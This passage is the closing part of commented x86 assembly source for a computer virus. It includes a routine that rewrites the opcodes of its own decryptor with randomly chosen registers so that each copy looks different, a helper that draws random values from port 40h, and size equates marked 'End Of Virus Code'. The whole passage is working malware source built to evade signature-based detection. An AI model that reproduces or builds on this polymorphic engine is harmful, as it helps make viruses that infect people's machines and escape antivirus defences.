;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> This function modifies the registers used in the decryptor, to make it
;	   polymorphic. The decrypor uses two registers; one as an index, and the
;	   other as a counter. The registers EAX, EBX, ECX, EDX, ESI and EDI are
;	   used as random registers. The opcodes are generated in the following way.
;	   First the opcode is calculated using register EAX; e.g. the opcode for
;	   POP EAX is 58h. To generate the opcodes for the other registers, we add
;	   the number of the register. The number for EDX is 2. Adding this to 58h,
;	   we get 5Ah, which is the opcode for POP EDX
;
; Arguments
;	-> EDI: Start of decrypor that need to be mutated
;
; Return Value:
;	-> None
;
; Registers Destroyed
;	-> AX, BL
;___________________
MutateDecryptor PROC
;Get Two Random Registers
	call	RandomRegister				;Get First Register Number
	mov		ah, al						;Save It
GetAnotherRegister:
	call	RandomRegister				;Get Second Register Number
	cmp		ah, al						;Is it the same as First
	je		GetAnotherRegister			;Yes, get another one

;Modify Decryptor, so that it uses the new registers
	mov		bl, 58h						;Change "pop <register1>"
	add		bl, al						;Register 1
	mov		byte ptr [edi + 5], bl
	mov		bl, 0C0h					;Change "add <register1>, ..."
	add		bl, al						;Register 1
	mov		byte ptr [edi + 7], bl
	mov		bl, 0B8h					;Change "mov <register2>, ..."
	add		bl, ah						;Register 2
	mov		byte ptr [edi + 9], bl
	mov		bl, 30h						;Change "xor byte ptr [<register1>], ..."
	add		bl, al						;Register 1
	mov		byte ptr [edi + 15], bl
	mov		bl, 40h						;Change "inc <register1>"
	add		bl, al						;Register 1
	mov		byte ptr [edi + 17], bl
	mov		bl, 48h						;Change "dec <register2>"
	add		bl, ah						;Register 2
	mov		byte ptr [edi + 18], bl

	ret
MutateDecryptor ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                            RandomRegister								| |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> This function returns a random number from 0, 1, 2, 3, 6, and 7. Each of
;	   these values is used to identify a register.
;	   EAX=0, ECX=1, EDX=2, EBX=3, ESI=6, EDI=7
;
; Arguments
;	-> None.
;
; Return Value:
;	-> AL:	Random number (0, 1, 2, 3, 6 or 7)
;
; Registers Destroyed
;	-> AL
;__________________
RandomRegister PROC
NewRandom:
	in		al, 40h						;Get Random Number
	and		al,00000111b				;Maximum value 7
	cmp		al, 4						;Should not be 4...
	je		NewRandom
	cmp		al, 5						;...or 5
	je		NewRandom
	ret
RandomRegister ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                          End Of Virus Code                             | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
VIRUS_SIZE			EQU		$ - offset StartOfVirusCode
ENCRYPTED_SIZE		EQU		$ - offset EncryptedVirusCode
LOADER_SIZE			EQU		VIRUS_SIZE - ENCRYPTED_SIZE
VIRUS_SIZE_PAGES	EQU		(VIRUS_SIZE / PAGE_SIZE) + 1
END StartOfVirusCode
